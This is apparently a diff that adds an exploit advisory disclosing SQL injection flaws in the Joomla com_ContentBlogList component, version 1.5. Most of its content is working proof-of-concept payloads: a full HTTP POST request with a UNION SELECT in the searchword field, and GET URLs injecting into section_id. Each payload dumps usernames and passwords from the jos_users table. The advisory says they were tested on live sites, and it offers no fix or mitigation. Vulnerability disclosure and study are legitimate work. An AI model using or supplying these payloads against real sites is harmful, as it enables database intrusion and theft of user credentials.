@@ -1,0 +1,50 @@
+[~]>> ...[BEGIN ADVISORY]...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> TITLE: Joomla (com_ContentBlogList) SQL Injection Vulnerabilities 
+[~]>> LANGUAGE: PHP
+[~]>> DORK: N/A
+[~]>> RESEARCHER: B-HUNT3|2
+[~]>> CONTACT: bhunt3r[at_no_spam]gmail[dot_no_spam]com
+[~]>> TESTED ON: Demo Site and Official Site
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> DESCRIPTION: Multiple input vars are vulnerable to SQL code injection.
+[~]>> AFFECTED VERSIONS: Confirmed in 1.5 but probably other versions also. 
+[~]>> RISK: High/Medium
+[~]>> IMPACT: Execute Arbitrary SQL queries
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> PROOF OF CONCEPT (DEMO SITE):
+
+------------------------[BEGIN-SNIP{searchword var}]---------------------------------
+
+POST http://server/index.php/search.html HTTP/1.1
+Host: www.server.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Referer: http://server/index.php/search.html
+Content-Type: application/x-www-form-urlencoded
+Content-length: 276
+
+searchword=Small%25%22%29%29+AND+0+UNION+ALL+SELECT+1,username,3,4,password,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,
+25,26,27,28,29,30+FROM+jos_users%23&Search=Ir&task=listsearch&searchphrase=all&ordering=newest&
+areas%5B%5D=content&Itemid=1&sectionid=0&limitstart=
+
+------------------------[END-SNIP{searchword var}]-----------------------------------
+
+[~]>> PROOF OF CONCEPT (OFFICIAL SITE):
+
+[~]>> AFFECTED VAR: id, section_id and more.
+ 
+[~]>> http://server/index.php?option=com_contentbloglist&task=listmonth&year=2010&month=1&section_id=[SQL]&Itemid=1
+[~]>> http://server/index.php?option=com_contentbloglist&task=listmonth&year=2010&month=1&section_id=999999+UNION+ALL+SELECT+1,username,3,4,password,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+jos_users&Itemid=1
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> ...[END ADVISORY]...
+ 
